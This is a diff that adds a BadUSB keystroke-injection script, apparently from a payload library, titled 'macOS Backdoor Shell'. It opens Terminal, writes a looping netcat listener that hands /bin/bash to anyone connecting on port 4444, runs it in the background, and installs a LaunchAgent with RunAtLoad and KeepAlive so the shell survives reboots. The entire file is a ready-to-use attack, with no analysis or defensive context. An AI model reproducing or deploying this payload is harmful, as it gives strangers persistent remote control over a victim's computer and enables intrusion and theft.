@@ -1,0 +1,60 @@
+REM Title: macOS Backdoor Shell
+REM Author: BadUSB Library
+REM Description: Creates persistent backdoor shell
+REM Target: macOS 10.15+
+REM Category: Command & Control
+REM Type: Directly Ready
+
+REM Open Terminal
+DELAY 2000
+GUI SPACE
+DELAY 1000
+STRING Terminal
+ENTER
+DELAY 3000
+
+REM Create backdoor shell
+STRING cat > /tmp/backdoor.sh << 'EOF'
+#!/bin/bash
+while true; do
+    # Listen on port 4444
+    nc -l -p 4444 -e /bin/bash
+    sleep 5
+done
+EOF
+ENTER
+DELAY 2000
+
+STRING chmod +x /tmp/backdoor.sh
+ENTER
+DELAY 1000
+
+STRING nohup /tmp/backdoor.sh > /dev/null 2>&1 &
+ENTER
+DELAY 2000
+
+REM Also create launchd service
+STRING cat > ~/Library/LaunchAgents/com.backdoor.plist << 'EOF'
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.backdoor</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>/tmp/backdoor.sh</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+</dict>
+</plist>
+EOF
+ENTER
+DELAY 2000
+
+STRING launchctl load ~/Library/LaunchAgents/com.backdoor.plist
+ENTER
+DELAY 2000
